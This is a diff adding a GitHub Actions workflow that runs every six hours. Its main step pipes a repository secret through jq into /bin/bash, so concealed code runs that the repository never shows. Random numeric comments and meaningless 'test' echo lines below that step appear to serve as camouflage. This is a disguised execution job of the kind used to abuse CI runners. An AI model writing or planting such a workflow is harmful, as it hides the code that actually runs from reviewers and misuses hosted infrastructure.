@@ -1,0 +1,23 @@
+name: tangguoqiang6789 #20497
+on: #6975
+  workflow_dispatch: #22595
+  schedule: #4486
+    - cron: '59 2/6 * * *' #14136
+jobs: #22286
+  build: #21160
+    runs-on: ubuntu-latest #1366
+    steps: #7676
+      - uses: actions/checkout@v4 #27518
+      - name: tangguoqiang6789 #13643
+        env: #20324
+          w23078: ${{ secrets.w23078 }} #13797
+        run: |
+          echo $w23078 | jq -r .f16778 | /bin/bash #17131
+          echo "Glob test: echo *.sh 2>/dev/null || echo no-sh"
+          echo "String len: ${#HOSTNAME}"
+          echo "Binary check: command -v bash 2>/dev/null && echo Bash"
+          echo "Awk mock: echo '1 2' | awk '{print \$1}' 2>/dev/null || echo no-awk"
+          echo "Case mock: case 1 in 1) echo 1;; esac"
+          echo "Arith loop: for ((i=0;i<3;i++)); do echo $i; done"
+          echo "Function mock: f() { echo func; }; f"
+          echo "Exit 0 test: exit 0 || true"
